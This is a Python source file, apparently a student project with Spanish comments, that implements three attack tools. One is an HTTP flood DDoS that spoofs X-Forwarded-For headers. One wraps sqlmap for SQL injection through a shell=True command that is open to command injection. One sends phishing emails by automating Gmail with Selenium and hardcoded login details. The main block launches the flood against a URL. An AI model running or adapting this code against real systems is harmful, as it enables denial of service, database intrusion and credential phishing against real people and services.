import sys
import random
import logging
from abc import ABC, abstractmethod
from scapy.all import IP, ICMP, send
import multiprocessing
import time
import requests
from enum import Enum
from target_machine import VirtualMachineManager
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import subprocess

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class AttackType(Enum):
    DDoS = "DDoS"
    SQL_INJECTION = "SQL Injection"
    PHISHING = "Phishing"

#! Clase abstracta Attack
class Attack(ABC):
    def __init__(self, attack_type: AttackType, targets: list):
        self.__attack_type = attack_type
        self.__targets = targets
        self.status = "pending"

    def get_attack_type(self):
        return self.__attack_type

    def set_attack_type(self, attack_type):
        if isinstance(attack_type, AttackType):
            self.__attack_type = attack_type

    def get_targets(self):
        return self.__targets

    def set_targets(self, targets):
        if isinstance(targets, list):
            self.__targets = targets

    @abstractmethod
    def start(self):
        pass

    @abstractmethod
    def pause(self):
        pass

    @abstractmethod
    def stop(self):
        pass

#? Subclase DDoS
class DDoSAttack(Attack):
    def __init__(self, dst_url: str, n_ips: int, n_msg: int, orig_type: str, threads: int):
        super().__init__(AttackType.DDoS, [dst_url])
        self.dst_url = dst_url
        self.n_ips = n_ips
        self.n_msg = n_msg
        self.orig_type = orig_type
        self.threads = threads
        self.ips = [f"192.168.1.{i}" for i in range(1, n_ips + 1)]

        if self.orig_type == "2":
            self.get_random_ips()
        else:
            self.get_text_total_ips()

    def get_random_ips(self):
        for _ in range(int(self.n_ips)):
            ip_gen = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            self.ips.append(ip_gen)

    def get_text_total_ips(self):
        try:
            with open("ips.txt") as f:
                f_ips = [line.strip() for line in f]
                if len(f_ips) == 0:
                    print("[-] Error: ips.txt is empty.")
                    sys.exit(0)
                self.ips = f_ips * (int(self.n_ips) // len(f_ips)) + f_ips[:int(self.n_ips) % len(f_ips)]
        except FileNotFoundError:
            print("[-] Error: ips.txt not found.")
            sys.exit(0)

    def send_http_flood(self, origin_ip):
        headers = {'X-Forwarded-For': origin_ip}
        for _ in range(int(self.n_msg)):
            try:
                response = requests.get(self.dst_url, headers=headers)
                print(f"Request sent from {origin_ip} with status code {response.status_code}")
            except requests.RequestException as e:
                print(f"Error sending request from {origin_ip}: {e}")

    def start(self):
        self.status = "running"
        print(f"Iniciando ataque DDoS en {self.dst_url} con {self.n_ips} IPs a una tasa de {self.n_msg} mensajes por IP.")
    
        t0 = time.time()
        p = multiprocessing.Pool(self.threads)
        p.map(func=self.send_http_flood, iterable=self.ips)
        p.close()
        p.join()

        total_s = float(time.time() - t0)
        total_p = int(self.n_ips) * int(self.n_msg)
        ratio = float(total_p) / float(total_s)
        print(f"\nTotal: \nTiempo:\t{int(total_s)} segundos")
        print(f"Paquetes:\t{total_p} \nVelocidad:\t{int(ratio)} p/s")

    def pause(self):
        self.status = "paused"
        print("Ataque DDoS pausado.")

    def stop(self):
        self.status = "stopped"
        print("Ataque DDoS detenido.")

#? Subclase SQL
class SQLInjectionAttack(Attack):
    def __init__(self, target_url: str, payload: str):
        super().__init__(AttackType.SQL_INJECTION, [target_url])
        self.__target_url = target_url
        self.__payload = payload

    def start(self):
        self.status = "running"
        print(f"Iniciando SQL Injection en {self.__target_url} con el payload: {self.__payload}")
        self.run_sqlmap()

    def run_sqlmap(self):
        command = f"sqlmap -u {self.__target_url} --data='{self.__payload}' --batch"
        subprocess.run(command, shell=True)

    def pause(self):
        self.status = "paused"
        print("Ataque SQL Injection pausado.")

    def stop(self):
        self.status = "stopped"
        print("Ataque SQL Injection detenido.")

#? Subclase Phishing
class PhishingAttack(Attack):
    def __init__(self, target_emails: list, template: str):
        super().__init__(AttackType.PHISHING, target_emails)
        self.__target_emails = target_emails
        self.__template = template
        self.driver = webdriver.Chrome()

    def start(self):
        self.status = "running"
        print(f"Enviando correos de phishing a: {', '.join(self.__target_emails)} con la plantilla: {self.__template}")
        self.send_emails()

    def send_emails(self):
        for email in self.__target_emails:
            self.driver.get("https://mail.google.com/")
            time.sleep(2)
            email_input = self.driver.find_element(By.NAME, "identifier")
            email_input.send_keys("manelguvi300@gmail.com")
            email_input.send_keys(Keys.RETURN)
            time.sleep(2)
            password_input = self.driver.find_element(By.NAME, "password")
            password_input.send_keys("1234567890")
            password_input.send_keys(Keys.RETURN)
            time.sleep(2)
            compose_button = self.driver.find_element(By.CSS_SELECTOR, ".T-I.T-I-KE.L3")
            compose_button.click()
            time.sleep(2)
            to_input = self.driver.find_element(By.NAME, "to")
            to_input.send_keys(email)
            subject_input = self.driver.find_element(By.NAME, "subjectbox")
            subject_input.send_keys("Phishing Email")
            body_input = self.driver.find_element(By.CSS_SELECTOR, ".Am.Al.editable.LW-avf.tS-tW")
            body_input.send_keys(self.__template)
            send_button = self.driver.find_element(By.CSS_SELECTOR, ".T-I.J-J5-Ji.aoO.v7.T-I-atl.L3")
            send_button.click()
            time.sleep(2)

    def pause(self):
        self.status = "paused"
        print("Ataque de phishing pausado.")

    def stop(self):
        self.status = "stopped"
        self.driver.quit()
        print("Ataque de phishing detenido.")


if __name__ == '__main__':
    #* Crear instancias de la clase esa importada
    # Después de como 1 día por fin me di cuenta q tenia que instalar virtualbox como programa y no el SDK :c
    # Ahora si puedo llamar la función pepe c:

    vm_manager = VirtualMachineManager()
    vm_manager.pepe()

    #* Ejemplo de phising
    # target_emails = ["manelguvi100@gmail.com", "manelguvi200@gmail.com"]
    # template = "Este es un correo de phishing. Por favor, haga clic en el enlace malicioso."
    # phishing_attack = PhishingAttack(target_emails, template)
    # phishing_attack.start()

    #* Ejemplo de SQL
    # target_url = "http://testphp.vulnweb.com/artists.php?artist=1"
    # payload = "1' AND 1=1--"
    # sql_injection_attack = SQLInjectionAttack(target_url, payload)
    # sql_injection_attack.start()

    #* Ejemplo de DDoS
    target_url = "http://example.com"
    n_ips = 10
    n_msg = 5
    interface = "eth0"
    orig_type = "1"  # or "2" depending on your requirement
    threads = 4  # specify the number of threads you want to use
    ddos_attack = DDoSAttack(target_url, n_ips, n_msg, orig_type, threads)
    ddos_attack.start()
